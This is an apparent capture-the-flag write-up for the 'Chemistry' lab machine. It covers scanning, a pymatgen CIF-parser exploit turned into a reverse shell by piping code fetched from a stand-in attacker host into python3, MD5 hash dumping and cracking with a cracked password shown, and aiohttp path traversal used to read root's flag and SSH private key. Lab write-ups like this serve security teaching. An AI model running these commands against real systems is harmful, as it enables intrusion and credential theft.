---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Chemistry
Linux machine

## Foothold

```shell
nmap -sV -v 10.10.11.38
```
We find ssh, http on port 5000.

We create an account and login.

We see an upload for a CIF file format. 
We find out it's a Python app from the responses.
We find a vulnerability POC for `CIF parser python` -> https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f.
Next we update the PoC to run a reverse shell on the target (e.g. `curl attacker:8080/backconnect.py|python3 -`). We are using the pty shells.

Now we have access to the `app` user.

## User

We can see that the app `app.py` is using sqlite3.

```shell
sqlite3 instance/database.sql
```

List tables:
```shell
.tables
```

List the user table
```shell
SELECT * FROM user;
```

We get users:
```
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|sad|49f0bad299687c62334182178bfd75d8
16|asd|f5052500fb9adfe861eddcb9bd1384e8

```

From the `app.py` code we can see that the passwords are in md5.
Also, from `/etc/passwd` we can see that the only real user is `rosa`.
We run hashcat on rosa's password (save it into `hash` file):
```shell
hashcat -m 0 hash rockyou.txt
```

The wordlists are in `/usr/share/wordlists`.

We get password
```shell
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
```
and access to the rosa user with the user flag.

## Root

Check running services:
```shell
ps aux
```

We can see a running web server.

Use `netstat -plnt` to get more information. It is running on localhost:8080.

Port forward the web app to your attacker machine (interfaces matter!):
```shell
ssh -L 127.0.0.1:8090:127.0.0.1:8080 rosa@10.10.11.38
```

Sauce for port forwarding [here](https://linuxize.com/post/how-to-setup-ssh-tunneling/#local-port-forwarding) and [here](https://www.adamchovanec.cz/blog/2024-05-23-port-forwarding-ssh/).

Fuzz the page
```shell
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://localhost:8090/FUZZ
```
Or check the path to the `assets/js/script.js` which can be found in the page source code.

Now use whatweb to get more information about the webpage:
```shell
whatweb 127.0.0.1:8090
```

We can see that the backend is aiohttp 3.9.1 which once we google it, has a [path traversal vulnerability](https://github.com/jhonnybonny/CVE-2024-23334).

We can exploit it like so:
```shell
curl --path-as-is localhost:8080/assets/../../../../../../../root/root.txt
```

Do not forget to use `--path-as-is`, otherwise curl will prettify it!

**Tip:** To get root access, get its private key:
```shell
curl --path-as-is localhost:8080/assets/../../../../../../../root/.ssh/id_rsa
```
